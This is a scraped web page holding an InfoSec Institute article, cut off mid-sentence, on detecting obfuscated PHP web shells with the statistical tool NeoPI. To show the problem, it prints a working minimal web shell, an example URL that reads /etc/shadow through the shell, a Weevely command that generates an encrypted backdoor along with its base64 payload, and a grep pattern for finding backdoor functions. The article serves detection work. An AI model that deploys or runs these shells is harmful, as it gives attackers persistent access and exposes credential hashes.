<div class='ig_inline_container ig_loop_start ig_before'></div><!doctype html>
<html class="no-js" lang="en-US" prefix="og: http://ogp.me/ns#">
  
  <head>
    <meta charset="UTF-8" />

<meta name="description" content="IT Security Training &amp; Resources by InfoSec Institute">
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><script type="text/javascript">window.NREUM||(NREUM={}),__nr_require=function(e,t,n){function r(n){if(!t[n]){var o=t[n]={exports:{}};e[n][0].call(o.exports,function(t){var o=e[n][1][t];return r(o||t)},o,o.exports)}return t[n].exports}if("function"==typeof __nr_require)return __nr_require;for(var o=0;o<n.length;o++)r(n[o]);return r}({1:[function(e,t,n){function r(e,t){return function(){o(e,[(new Date).getTime()].concat(a(arguments)),null,t)}}var o=e("handle"),i=e(2),a=e(3);"undefined"==typeof window.newrelic&&(newrelic=NREUM);var u=["setPageViewName","addPageAction","setCustomAttribute","finished","addToTrace","inlineHit"],c=["addPageAction"],f="api-";i(u,function(e,t){newrelic[t]=r(f+t,"api")}),i(c,function(e,t){newrelic[t]=r(f+t)}),t.exports=newrelic,newrelic.noticeError=function(e){"string"==typeof e&&(e=new Error(e)),o("err",[e,(new Date).getTime()])}},{}],2:[function(e,t,n){function r(e,t){var n=[],r="",i=0;for(r in e)o.call(e,r)&&(n[i]=t(r,e[r]),i+=1);return n}var o=Object.prototype.hasOwnProperty;t.exports=r},{}],3:[function(e,t,n){function r(e,t,n){t||(t=0),"undefined"==typeof n&&(n=e?e.length:0);for(var r=-1,o=n-t||0,i=Array(0>o?0:o);++r<o;)i[r]=e[t+r];return i}t.exports=r},{}],ee:[function(e,t,n){function r(){}function o(e){function t(e){return e&&e instanceof r?e:e?u(e,a,i):i()}function n(n,r,o){e&&e(n,r,o);for(var i=t(o),a=l(n),u=a.length,c=0;u>c;c++)a[c].apply(i,r);var s=f[g[n]];return s&&s.push([m,n,r,i]),i}function p(e,t){w[e]=l(e).concat(t)}function l(e){return w[e]||[]}function d(e){return s[e]=s[e]||o(n)}function v(e,t){c(e,function(e,n){t=t||"feature",g[n]=t,t in f||(f[t]=[])})}var w={},g={},m={on:p,emit:n,get:d,listeners:l,context:t,buffer:v};return m}function i(){return new r}var a="nr@context",u=e("gos"),c=e(2),f={},s={},p=t.exports=o();p.backlog=f},{}],gos:[function(e,t,n){function r(e,t,n){if(o.call(e,t))return e[t];var r=n();if(Object.defineProperty&&Object.keys)try{return Object.defineProperty(e,t,{value:r,writable:!0,enumerable:!1}),r}catch(i){}return e[t]=r,r}var o=Object.prototype.hasOwnProperty;t.exports=r},{}],handle:[function(e,t,n){function r(e,t,n,r){o.buffer([e],r),o.emit(e,t,n)}var o=e("ee").get("handle");t.exports=r,r.ee=o},{}],id:[function(e,t,n){function r(e){var t=typeof e;return!e||"object"!==t&&"function"!==t?-1:e===window?0:a(e,i,function(){return o++})}var o=1,i="nr@id",a=e("gos");t.exports=r},{}],loader:[function(e,t,n){function r(){if(!w++){var e=v.info=NREUM.info,t=s.getElementsByTagName("script")[0];if(e&&e.licenseKey&&e.applicationID&&t){c(l,function(t,n){e[t]||(e[t]=n)});var n="https"===p.split(":")[0]||e.sslForHttp;v.proto=n?"https://":"http://",u("mark",["onload",a()],null,"api");var r=s.createElement("script");r.src=v.proto+e.agent,t.parentNode.insertBefore(r,t)}}}function o(){"complete"===s.readyState&&i()}function i(){u("mark",["domContent",a()],null,"api")}function a(){return(new Date).getTime()}var u=e("handle"),c=e(2),f=window,s=f.document;NREUM.o={ST:setTimeout,CT:clearTimeout,XHR:f.XMLHttpRequest,REQ:f.Request,EV:f.Event,PR:f.Promise,MO:f.MutationObserver},e(1);var p=""+location,l={beacon:"bam.nr-data.net",errorBeacon:"bam.nr-data.net",agent:"js-agent.newrelic.com/nr-918.min.js"},d=window.XMLHttpRequest&&XMLHttpRequest.prototype&&XMLHttpRequest.prototype.addEventListener&&!/CriOS/.test(navigator.userAgent),v=t.exports={offset:a(),origin:p,features:{},xhrWrappable:d};s.addEventListener?(s.addEventListener("DOMContentLoaded",i,!1),f.addEventListener("load",r,!1)):(s.attachEvent("onreadystatechange",o),f.attachEvent("onload",r)),u("mark",["firstbyte",a()],null,"api");var w=0},{}]},{},["loader"]);</script>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
<link rel="stylesheet" href="http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/themes/infosec/style.css" />
<link rel="pingback" href="http://resources.infosecinstitute.com/xmlrpc.php" />
<script>var ajaxUrl = 'http://resources.infosecinstitute.com/wp-admin/admin-ajax.php';</script>

<!-- This site is optimized with the Yoast SEO plugin v2.3.2 - https://yoast.com/wordpress/plugins/seo/ -->
<title>Web Shell Detection Using NeoPI - InfoSec Resources</title>
<meta name="description" content="This article was part of a talk presented at BSidesChicago. Whats Up With These Pesky Shells? Web servers have become one of the main targets of malicious"/>
<link rel="canonical" href="http://resources.infosecinstitute.com/web-shell-detection/" />
<meta property="og:locale" content="en_US" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Web Shell Detection Using NeoPI - InfoSec Resources" />
<meta property="og:description" content="This article was part of a talk presented at BSidesChicago. Whats Up With These Pesky Shells? Web servers have become one of the main targets of malicious" />
<meta property="og:url" content="http://resources.infosecinstitute.com/web-shell-detection/" />
<meta property="og:site_name" content="InfoSec Resources" />
<meta property="article:tag" content="hacking" />
<meta property="article:section" content="Forensics" />
<meta property="article:published_time" content="2011-04-13T20:10:38+00:00" />
<meta property="article:modified_time" content="2013-02-15T09:20:41+00:00" />
<meta property="og:updated_time" content="2013-02-15T09:20:41+00:00" />
<meta property="og:image" content="http://resources.infosecinstitute.com/wp-content/uploads/CSV-output-file.jpg" />
<meta property="og:image" content="http://resources.infosecinstitute.com/wp-content/uploads/root-at-1.jpg" />
<meta property="og:image" content="http://resources.infosecinstitute.com/wp-content/uploads/root-at-2.jpg" />
<meta property="og:image" content="http://resources.infosecinstitute.com/wp-content/uploads/C-scan1.jpg" />
<meta property="og:image" content="http://resources.infosecinstitute.com/wp-content/uploads/php-text.jpg" />
<!-- / Yoast SEO plugin. -->

<link rel="alternate" type="application/rss+xml" title="InfoSec Resources &raquo; Web Shell Detection Using NeoPI Comments Feed" href="http://resources.infosecinstitute.com/web-shell-detection/feed/" />
		<script type="text/javascript">
			window._wpemojiSettings = {"baseUrl":"http:\/\/s.w.org\/images\/core\/emoji\/72x72\/","ext":".png","source":{"concatemoji":"http:\/\/resources.infosecinstitute.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=4.3.3"}};
			!function(a,b,c){function d(a){var c=b.createElement("canvas"),d=c.getContext&&c.getContext("2d");return d&&d.fillText?(d.textBaseline="top",d.font="600 32px Arial","flag"===a?(d.fillText(String.fromCharCode(55356,56812,55356,56807),0,0),c.toDataURL().length>3e3):(d.fillText(String.fromCharCode(55357,56835),0,0),0!==d.getImageData(16,16,1,1).data[0])):!1}function e(a){var c=b.createElement("script");c.src=a,c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var f,g;c.supports={simple:d("simple"),flag:d("flag")},c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.simple&&c.supports.flag||(g=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",g,!1),a.addEventListener("load",g,!1)):(a.attachEvent("onload",g),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),f=c.source||{},f.concatemoji?e(f.concatemoji):f.wpemoji&&f.twemoji&&(e(f.twemoji),e(f.wpemoji)))}(window,document,window._wpemojiSettings);
		</script>
		<style type="text/css">
img.wp-smiley,
img.emoji {
	display: inline !important;
	border: none !important;
	box-shadow: none !important;
	height: 1em !important;
	width: 1em !important;
	margin: 0 .07em !important;
	vertical-align: -0.1em !important;
	background: none !important;
	padding: 0 !important;
}
</style>
<link rel='stylesheet' id='cptch_stylesheet-css'  href='http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/plugins/captcha/css/style.css?ver=4.3.3' type='text/css' media='all' />
<link rel='stylesheet' id='wpjb-glyphs-css'  href='http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/plugins/wpjobboard/public/css/wpjb-glyphs.css?ver=4.3.3' type='text/css' media='all' />
<link rel='stylesheet' id='wpjb-css-css'  href='http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/plugins/wpjobboard/public/css/frontend.css?ver=4.3.1' type='text/css' media='all' />
<link rel='stylesheet' id='enlighter-local-css'  href='http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/plugins/enlighter/resources/EnlighterJS.min.css?ver=4.3.3' type='text/css' media='all' />
<!-- This site uses the Google Analytics by Yoast plugin v5.4.4 - Universal enabled - https://yoast.com/wordpress/plugins/google-analytics/ -->
<script type="text/javascript">
	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
		(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
		m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
	})(window,document,'script','//www.google-analytics.com/analytics.js','__gaTracker');

	__gaTracker('create', 'UA-146509-8', 'auto');
	__gaTracker('set', 'forceSSL', true);
	__gaTracker('require', 'displayfeatures');
	__gaTracker('send','pageview');

</script>
<!-- / Google Analytics by Yoast -->
<script type='text/javascript' src='http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/themes/infosec/js/vendor/modernizr.min.js'></script>
<script type='text/javascript' src='http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/themes/infosec/js/vendor/device.min.js'></script>
<script type='text/javascript' src='//ajax.googleapis.com/ajax/libs/mootools/1.5.1/mootools-yui-compressed.js?ver=4.3.3'></script>
<script type='text/javascript' src='http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/plugins/enlighter/resources/EnlighterJS.min.js?ver=4.3.3'></script>
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://resources.infosecinstitute.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://resources.infosecinstitute.com/wp-includes/wlwmanifest.xml" /> 
<link rel='shortlink' href='http://resources.infosecinstitute.com/?p=1506' />
<script type="text/javascript">/* <![CDATA[ */window.addEvent('domready', function(){if (typeof EnlighterJS == "undefined"){return;};EnlighterJS.Util.Init('pre.EnlighterJSRAW', 'code.EnlighterJSRAW', {"language":"standard","theme":"git","indent":-1,"hover":"hoverEnabled","showLinenumbers":true,"rawButton":true,"infoButton":true,"windowButton":true,"rawcodeDoubleclick":false,"grouping":true,"cryptex":{"enabled":true,"email":"mail@example.tld"}});});/* ]]> */</script>
<style type="text/css" id="syntaxhighlighteranchor"></style>
  </head>

  <body class="single single-post postid-1506 single-format-standard without-series">
    
    <div id="fb-root"></div>
    
          <header class="masthead">
  
  <div>
    <div class="col-3-3">
      
      <nav class="top-left">
        <ul>
                      <li>
  <a href="http://infosecinstitute.com">InfoSec Institute</a>
      <ul>
              <li>
          <a href="http://www.infosecinstitute.com/courses/security.html">IT Security Boot Camps</a>
        </li>
              <li>
          <a href="http://www.infosecinstitute.com/infosec_institute/contact_us.html">Contact InfoSec</a>
        </li>
              <li>
          <a href="http://www.infosecinstitute.com/enterprise-wide-training2.html">Enterprise & Government</a>
        </li>
          </ul>
  </li>                      <li>
  <a href="http://www.intenseschool.com">Intense School</a>
  </li>                      <li>
  <a href="http://certs.infosecinstitute.com/">Certification Tracker</a>
  </li>                  </ul>
      </nav>
      
      <nav class="top-right">
        <ul>
                  </ul>
      </nav>
      
    </div>
  </div>
  
  <div>
    <div class="col-3-3">
      
              
        <div class="logo">
          <a href="http://resources.infosecinstitute.com">
            <img src="http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/themes/infosec/assets/imagery/logo.svg" alt="InfoSec Resources" title="InfoSec Resources" width="126">
          </a>
        </div>
          
            
      <a class="menu-button mobile" href="#site-navigation" data-attr="main:toggle">Menu</a>

      <nav class="main" id="site-navigation">
        
        <a class="mobile" href="#" data-attr="main:remove" aria-hidden="true">Close Menu</a>
        <a class="mobile" href="#" data-attr="topics:remove" aria-hidden="true">Back</a>
        <a class="mobile" href="#" data-attr="content-archives:remove" aria-hidden="true">Back</a>
      
        <ul>
          <li class="mobile menu-item menu-item-type-custom menu-item-object-custom menu-item-4748"><a href="http://infosec.wpengine.com">Return Home</a></li><li class="has-dropdown  menu-item menu-item-type-custom menu-item-object-custom menu-item-4750 menu-item-has-children"><a href="" data-attr="topics:set">Topics</a><ul data-menu-container="topics"><li><a href="http://resources.infosecinstitute.com/category/hacking-2/" title="Hacking">
                          Hacking
                        </a></li><li><a href="http://resources.infosecinstitute.com/category/certifications-training/" title="IT Certifications">
                          IT Certifications
                        </a></li><li><a href="http://resources.infosecinstitute.com/category/forensics-2/" title="Forensics">
                          Forensics
                        </a></li><li><a href="http://resources.infosecinstitute.com/category/application-security-2/" title="Secure Coding">
                          Secure Coding
                        </a></li><li><a href="http://resources.infosecinstitute.com/category/pen-testing-1/" title="Penetration Testing">
                          Penetration Testing
                        </a></li><li><a href="http://resources.infosecinstitute.com/category/general-security-2/" title="General Security">
                          General Security
                        </a></li><li><a href="http://resources.infosecinstitute.com/category/cloud-computing/" title="Cloud Computing">
                          Cloud Computing
                        </a></li><li><a href="http://resources.infosecinstitute.com/category/interviews/" title="Interviews">
                          Interviews
                        </a></li><li><a href="http://resources.infosecinstitute.com/category/virtualization-security/" title="Virtualization Security">
                          Virtualization Security
                        </a></li><li><a href="http://resources.infosecinstitute.com/category/wireless-security/" title="Wireless Security">
                          Wireless Security
                        </a></li><li><a href="http://resources.infosecinstitute.com/category/scada-2/" title="SCADA / ICS Security">
                          SCADA / ICS Security
                        </a></li><li><a href="http://resources.infosecinstitute.com/category/reverse-engineering-2/" title="Reverse Engineering">
                          Reverse Engineering
                        </a></li><li><a href="http://resources.infosecinstitute.com/category/data-recovery/" title="Data Recovery">
                          Data Recovery
                        </a></li><li><a href="http://resources.infosecinstitute.com/category/exploit-development/" title="Exploit Development">
                          Exploit Development
                        </a></li><li><a href="http://resources.infosecinstitute.com/category/compliance-auditing/" title="Management, Compliance, & Auditing">
                          Management, Compliance, & Auditing
                        </a></li><li><a href="http://resources.infosecinstitute.com/category/incident-response-resources/" title="Incident Response">
                          Incident Response
                        </a></li><li><a href="http://resources.infosecinstitute.com/category/certifications-training/" title="IT Certifications">
                          IT Certifications
                        </a></li><li><a href="http://resources.infosecinstitute.com/category/certifications-training/securityplus/" title="Security+">
                          Security+
                        </a></li><li><a href="http://resources.infosecinstitute.com/category/security-awareness/" title="Security Awareness">
                          Security Awareness
                        </a></li><li><a href="http://resources.infosecinstitute.com/category/phishing/" title="Phishing">
                          Phishing
                        </a></li></ul></li><li class=" menu-item menu-item-type-post_type menu-item-object-page menu-item-4758"><a href="http://resources.infosecinstitute.com/contributors/">Contributors</a></li><li class="has-dropdown desktop menu-item menu-item-type-custom menu-item-object-custom menu-item-30046 menu-item-has-children"><a href="#" data-attr="archive:set">Archive</a><ul data-menu-container="archive"><li><a href="http://resources.infosecinstitute.com/2015/" title="2015">
                          2015
                        </a></li><li><a href="http://resources.infosecinstitute.com/2014/" title="2014">
                          2014
                        </a></li><li><a href="http://resources.infosecinstitute.com/2013/" title="2013">
                          2013
                        </a></li><li><a href="http://resources.infosecinstitute.com/2012" title="2012">
                          2012
                        </a></li><li><a href="http://resources.infosecinstitute.com/2011" title="2011">
                          2011
                        </a></li><li><a href="http://resources.infosecinstitute.com/2010" title="2010">
                          2010
                        </a></li></ul></li><li class="mobile menu-item menu-item-type-custom menu-item-object-custom menu-item-30121"><a href="http://resources.infosecinstitute.com/2015">Archive</a></li><li class=" menu-item menu-item-type-post_type menu-item-object-page menu-item-32427"><a href="http://resources.infosecinstitute.com/job-titles/">Careers</a></li><li class=" menu-item menu-item-type-custom menu-item-object-custom menu-item-32598"><a href="https://securityiq.infosecinstitute.com">Phish.io</a></li>          
        </ul>
      </nav>
      
      <nav class="search">
        <form class="search-form" action="http://www2.infosecinstitute.com/s/12882/ntpoCCBNQ1ttbNTP3ylPLZZeUqLrVgCT" method="get">
  <fieldset>
    <input type="text" name="s" class="icon search" id="search" value="">
    <input type="submit" class="icon search" title="Search">
  </fieldset>
</form>
      </nav>
      
    </div>
  </div>
  
</header>          
    <main>
      
      <section class="hero full">
          
	<div class="post-col-3-3 wrapper">
    
    <div class="post-col-2-3 hook" style="background-image: url('');">
      <header>
        <h1>Web Shell Detection Using NeoPI</h1>
                <div class="meta">
  Posted in  <a href="/category/forensics-2">Forensics</a> on April 13, 2011
</div>      </header>
      <div class="share horizontal">
  
  <span data-attr="share:toggle" class="icon share-l">Share</span>
  
  <ul>
    
    <li class="twitter">
      <a class="twitter-share-button"
        href="https://twitter.com/share"
        data-size="medium"
        data-url="http://resources.infosecinstitute.com/web-shell-detection/"
        data-count-url="http://resources.infosecinstitute.com/web-shell-detection/"
        data-via="InfosecEdu"
        data-related="infosecedu"
        data-hashtags="infosec"
        data-text="Web Shell Detection Using NeoPI">
      Tweet
      </a>
    </li>
    
    <li class="google">
      <div class="g-plus"
        data-action="share"
        data-annotation="bubble">
      </div>
    </li>
    
    <li class="linkedin">
      <script type="IN/Share" data-counter="right"></script>
    </li>
    
    <li class="reddit">
      <script type="text/javascript" src="//www.redditstatic.com/button/button1.js"></script>
    </li>
    
    <li class="facebook">
      <div class="fb-like"
        data-width="90"
        data-layout="button_count"
        data-action="like"
        data-show-faces="false"
        data-share="false"
      ></div>
    </li>
    
  </ul>
  
</div>    </div>
    
    <div class="post-col-1-3">
      
              <div class="endemic-ad" style="background-image: url(http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/uploads/5-17.png);">
  <div>
    <h3>Computer Forensics Boot Camp</h3>
    <h4>A course in one of the fastest-growing careers in tech!</h4>
    <p></p>
    <a href="http://www2.infosecinstitute.com/l/12882/2015-05-05/mxr3k" target="_blank">Click Here!</a>
  </div>
</div>            
      <div class="skillset box  empty">
  
  <h3>Skillset</h3>
  
  <a href="#skillset-modal" rel="modal:open">What's this?</a>
  
  
  <p>Practice for certification success with the <a href="http://www.skillset.com" style="color:#8bc7e4;">Skillset library of over 100,000 practice test questions</a>. We analyze your responses and can determine when you are ready to sit for the test.</p>

  
  
</div>      
    </div>
    
  </div>
  
      </section>
      
      <section class="content full">
        <div class="col-3-3 wrapper">
                      
  <div class="main post-col-2-3">
    <article class="post-content">
      <div class='ig_inline_container ig_the_content ig_before'></div><p>This article was part of a talk presented at <a href="http://www.securitybsides.com/w/page/32207692/BSidesChicago" onclick="__gaTracker('send', 'event', 'outbound-article', 'http://www.securitybsides.com/w/page/32207692/BSidesChicago', 'BSidesChicago');">BSidesChicago</a>.</p>
<h1>Whats Up With These Pesky Shells?</h1>
<p>Web servers have become one of the main targets of malicious activity and are often a weak point within an organization’s infrastructure. Web application code is often deployed and forgotten or unmaintained by an organization, creating weak points which are vulnerable to attack. Web applications are often developed in scripting languages such as PHP, Python, Ruby, Perl, etc. These languages are sophisticated enough that a security issue within a web application can often lead to the execution of arbitrary scripting code.</p>
<p>When one of these conditions is identified by an attacker they often seek to persist their access by the deployment of web shell code. This code creates a “virtual” shell accessible via the web server. The shell typically permits system command execution and file access, among other possibly nasty functionality.</p>
<p>Imagine you are hosting a website that you believe may have been compromised. Your shared web server has thousands of PHP pages and an attacker may have planted a backdoor in any one, or more, of them. You have tried scanning the system and checking IDS logs but you think the backdoor may be customized particularly for your environment. As a result, signature based tools are coming up empty. How do you detect and remove this backdoor if current tools such as antivirus and IDS can’t detect it?</p>
<p>The type of backdoor we are discussing is a web shell. Web shells can be defined as an undocumented way to gain console access to a computer system though a dynamic server side web page. Traditionally these web-shells were simple and easy to detect. For example, let’s take the following PHP file:</p>
<p><code lang="python"><!--?php <br ?--> if(isset($_REQUEST['cmd'])){<br />
echo "</code></p>
<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>
<p>&#8220;;<br />
die;<br />
}<br />
?&gt;</p>
<p>This shell is straightforward and allows an attacker to simply enter a URL such as the fabricated example below to execute commands:</p>
<p><code lang="python">http://comprimised-system.com/simple-backdoor.php?cmd=cat+/etc/shadow</code></p>
<p>More sophisticated web shells include methods to interact with the console, edit files, etc. The readme file for the C99 shell, a webshell that has been around for almost a decade, states the following feature set:</p>
<p><code lang="python">SQL Manager<br />
Visual File Manager (Many Features)<br />
PHP Eval<br />
Mail Bomber<br />
Get all readable home directories<br />
...</code></p>
<h2>How do we detect unencrypted shells?</h2>
<p>Shells such as C99 can be detected by crafting some keyword searches or using a signature based detection tool. We could grep for the following on a web-server in an attempt to locate a PHP backdoor (adapted from Steven Whitney):</p>
<p><code lang="python">grep -RPn "(system|phpinfo|pcntl_exec|python_eval|base64_decode|gzip|mkdir|fopen|fclose|readfile|passthru)" /pathto/webdir/ </code></p>
<p>As one can imagine, this would generate a huge number of false positives, as many of these calls are used by legitimate web applications. We could also try a tool like Linux Malware Detect (LMD) . We ran Linux Malware Detect against a web command shell repository of 90 backdoors. LMD was able to detect 37 webshells out of the 90 scanned. This low of a rate of detection isn’t that surprising, as some of these web shells were Windows specific. What was surprising was Linux Malware Detect failed to detect some of the obfuscated webshells such as isko, shellzx, and fatal from the repository.</p>
<h2>How do these methods work against custom shells?</h2>
<p>We also created a custom webshell. We used the tool Weevely to generate an obfuscated and encrypted backdoor using the following commands:</p>
<p><code lang="python">server# python weevely.py -g -o test_shell.php -p qazwsxedc</code></p>
<p>This generated an encrypted web shell using the password ‘qazwsxedc’:</p>
<p><code lang="python"><!--?php <br ?--> eval(base64_decode('cGFyc2Vfc3RyKCRfU0VSVkVSWydIVFRQX1JFRkVSRVInXSwkYSk7IGlmKHJlc 2V0KCRhKT09J3FhJyAmJiBjb3VudCgkYSk9PTkpIHsgZWNobyAnPHp3c3hlZGM+JztldmFsKGJhc2U2NF 9kZWNvZGUoc3RyX3JlcGxhY2UoIiAiLCAiKyIsIGpvaW4oYXJyYXlfc2xpY2UoJGEsY291bnQoJGEpLTM pKSkpKTtlY2hvICc8L3p3c3hlZGM+Jzt9'));<br />
?&gt;</code></p>
<p>We scanned the directory again with LMD and the test_shell.php was not detected.</p>
<p>In order to circumvent signature based detection, some web shells, like the one generated with Weevely, have implemented mechanisms specifically aimed at avoiding detection. Customized code is compressed and encryption techniques are used to obfuscate the code and avoid detection. This is especially effective at thwarting signature based detection systems or keyword searches. In addition, finding such files on enterprise web servers that contain tens of thousands of pages can be extremely difficult due to the sheer volume of data.</p>
<h2>How easy is it to deploy a web shell?</h2>
<p>Deploying these shells can be facilitated by a number of methods: command injection, file upload vulnerabilities, insecure FTP, and remote file include vulnerabilities. If the attacker can get the web server to execute the backdoor, the attacker gains shell level access with the host operating system running with the same privileges as the web server.</p>
<p>If we aren’t able to reliably detect web shells with traditional methods such as signature based detection what options do we have left? Enter NeoPI.</p>
<h1>NeoPI</h1>
<h2>Overview</h2>
<p>NeoPI is a Python script that uses a variety of statistical methods to detect obfuscated and encrypted content within text and script files. The intended purpose of NeoPI is to aid in the identification of hidden web shell code. The development focus of NeoPI was creating a tool that could be used in conjunction with other established detection methods such as Linux Malware Detect or traditional signature/keyword based searches.</p>
<p>NeoPI is platform independent and can be run on any system with Python 2.6 installed. The user running the script should have read access to all of the files that will be scanned.</p>
<p>NeoPI recursively scans through the file system from a base directory and will rank files based on the results of a number of tests. The ranking helps identify with a higher probability which files may be encrypted web shells. It also presents a “general” score derived from file rankings within the individual tests.</p>
<h2>Analysis Methods Explained</h2>
<p>NeoPI uses several different statistical methods to try and determine the likelihood that a file contains obfuscated code.</p>
<h3>Longest String</h3>
<p>The longest string test identifies the length of the longest uninterrupted string within a file. This is useful because obfuscated code is often stored as a long string of encoded text within a file. Many popular encoding methods, such as base64 encoding, will produce a long string without space characters. Typical text and script files will be composed of relatively short length words; identifying files with uncharacteristically long strings may help to identify files with obfuscated code.</p>
<p><code lang="python">longest = 0<br />
words = re.split("[\s,\n,\r]", data)<br />
if words:<br />
for word in words:<br />
if len(word) &gt; longest:<br />
longest = len(word)<br />
return longest</code></p>
<p>The above code splits a string into “words” by space characters, new lines, and carriage returns. It then identifies and returns the length of the longest word.</p>
<h3>Entropy</h3>
<p>Entropy is a measure of uncertainty within a value. Shannon entropy quantifies the expected value of the information contained in a message, usually in units such as bits. This test calculates the “Shannon entropy” of a file by determining the minimum number of bytes required to encode a file. This can be thought of as a measure of randomness. Measuring entropy is useful in locating encrypted shellcode. Encryption can often introduce a large amount of entropy into a text string.</p>
<p><code lang="python">entropy = 0<br />
for x in range(256):<br />
p_x = float(data.count(chr(x)))/len(data)<br />
if p_x &gt; 0:<br />
entropy += - p_x * math.log(p_x, 2)<br />
return entropy</code></p>
<p>The above code will calculate the Shannon entropy of “data” and return a floating point number between 0 and 8. This value represents the byte entropy of “data”. This number equates to the number of bits per character required to represent “data”. A file containing a large degree of randomness or information would require more bits to communicate, hence producing a larger entropy value. Changing the log base from 2 to 8 within this function would return a value between 0 and 1. This may be usefull to match other calculated measures of entropy. The higher the number, the more entropy is present within the data string indicating a high degree of randomness or variety of information.</p>
<h3>Index of Coincidence</h3>
<p>The index of coincidence (I.C.) is a technique used in the cryptanalysis and natural language analysis of text. It calculates the occurrence of letter combinations as compared to a text sample where all letters are equally distributed. This returns a value which is generally consistent for different types of text; either by spoken language or scripting language. This value is useful in identifying text files with I.C.’s uncharacteristic for files of similar type. This may indicate that the file contains portions of text, either encoded or encrypted, that deviate from normal character distributions.</p>
<p><code lang="python">char_count = 0<br />
total_char_count = 0<br />
for x in range(256):<br />
char = chr(x)<br />
charcount = data.count(char)<br />
char_count += charcount * (charcount - 1)<br />
total_char_count += charcount<br />
ic = float(char_count)/(total_char_count * (total_char_count - 1))<br />
self.ic_results.append({"filename":filename, "IC":ic})<br />
# Call method to caculate_char_count and append to total_char_count<br />
self.caculate_char_count(data)<br />
return ic</code></p>
<p>The above code calculates the I.C.for string “data”. It will return a floating point number.</p>
<h1>Future Development</h1>
<p>Several features are planned for the future development of NeoPI.</p>
<ul>
<li>Additional tests and fine tuning of tests based upon the file format may help detect anomalies. An example of this would be to run and collect an average Index of Coincidence of each web programming language. The current method for building the average index of coincidence is to only take the average of the files scanned. So one method for creating this may be building out very large python code repositories, running the index of coincidence, and storing that information. An example use case could be Python files deviating from an expected I.C.range for typical Python files would be flagged.</li>
<li>Block entropy is another function we would like to add to the statistical analysis. Block entropy would allow us to read in files based on a predefined block size and analyze sub-portions of the test for entropy. This may help detect shells that use a combination of English Text and encrypted block to avoid detection.</li>
<li>Multi-threading to speed up file analysis would be beneficial on ultra large web deployments.</li>
</ul>
<p>Finally, we also plan on adding some basic signature detection scans to provide a secondary mechanism for detecting web shells.</p>
<h1>How to use it</h1>
<p>NeoPI is platform independent and will run on both Linux and Windows. To start using NeoPI first checkout the code from our github repository or from this <a href="https://github.com/Neohapsis/NeoPI" onclick="__gaTracker('send', 'event', 'outbound-article', 'https://github.com/Neohapsis/NeoPI', 'website.');">website.</a></p>
<p><code lang="python">git clone ssh://git@github.com:Neohapsis/NeoPI.git</code></p>
<p>The small NeoPI script is now in your local directory. We are going to go though a few examples on Linux and then switch over to Windows.</p>
<p>Let’s run neopi.py with the -h flag to see the options.</p>
<p><code lang="python">[sbehrens@WebServer2 opt]$ ./neopi.py -h<br />
Usage: neopi.py [options] </code></p>
<p><code lang="python">Options:<br />
--version show program's version number and exit<br />
-h, --help show this help message and exit<br />
-C FILECSV, --csv=FILECSV<br />
generate CSV outfile<br />
-a, --all Run all tests [Entropy, Longest Word, Compression<br />
-e, --entropy Run entropy Test<br />
-l, --longestword Run longest word test<br />
-c, --ic Run IC test<br />
-A, --auto Run auto file extension tests</code></p>
<p>Let’s break down the options into greater detail.<br />
<code lang="python">-C FILECSV, --csv=FILECSV</code></p>
<p>This generates a CSV output file containing the results of the scan.<br />
<a href="http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/uploads/CSV-output-file.jpg"><img class="alignleft size-full wp-image-1508" title="CSV output file" src="http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/uploads/CSV-output-file.jpg" alt="" width="674" height="219" /></a><br />
-a, &#8211;all<br />
This runs all tests including entropy, longest word, and index of coincidence. In general, we suggest running all tests to build the most comprehensive list of possible web shells.</p>
<p>-e, &#8211;entropy<br />
This flag can be set to run only the entropy test.</p>
<p>-l, &#8211;longestword<br />
This flag can be set to run only the longest word test.</p>
<p>-c, &#8211;ic<br />
This flag can be set to run only the Index of Coincidence test.</p>
<p>-A, &#8211;auto</p>
<p>This flag runs an auto generated regular expression that contains many common web application file extensions. This list is by no means comprehensive but does include a good ‘best effort’ scan if you are unsure of what web application languages your server is running. The current list of extensions are included below:</p>
<p><code lang="python">valid_regex = re.compile('\.php|\.asp|\.aspx|\.sh|\.bash|\.zsh|\.csh|\.tsch|\.pl|\.py|\.txt|\.cgi|\.cfm')</code></p>
<p>Now that we are familiar with the flags and we have downloaded a copy of the script from GIT, let’s go ahead and run it on a web server we think may be infected with obfuscated web shells. To get a feel for how many pages we have let’s run the following command:<br />
